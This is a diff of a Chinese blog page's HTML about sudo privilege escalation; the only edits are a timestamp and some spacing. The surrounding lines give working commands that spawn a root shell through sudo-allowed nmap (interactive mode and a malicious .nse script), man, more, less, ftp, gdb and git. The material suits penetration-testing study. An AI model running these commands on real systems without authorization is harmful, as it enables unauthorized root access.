@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Fxven Blog">
 <meta property="og:description" content="Sudo Privilege Escalation">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-20T10:25:51.318Z">
+<meta property="og:updated_time" content="2019-04-20T10:27:53.402Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sudo提权">
 <meta name="twitter:description" content="Sudo Privilege Escalation">
@@ -366,7 +366,7 @@
 <li><strong>nmap</strong><br>旧版本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap --interactive</span><br><span class="line">nmap&gt; !/bin/sh</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>&ensp;&ensp;<code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</code></p>
+<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</code></p>
 <ul>
 <li><strong>man,more,less,ftp,gdb,git</strong><br><code>sudo man man</code>  &ensp;<code>sudo more /etc/hosts</code> &ensp;<code>sudo less /etc/hosts</code><br><code>sudo ftp</code> &ensp;<code>sudo gdb</code> &ensp;<code>sudo git help status</code><br>&ensp;<strong>之后输入!/bin/sh</strong></li>
 <li><p><strong>tcpdump</strong></p>
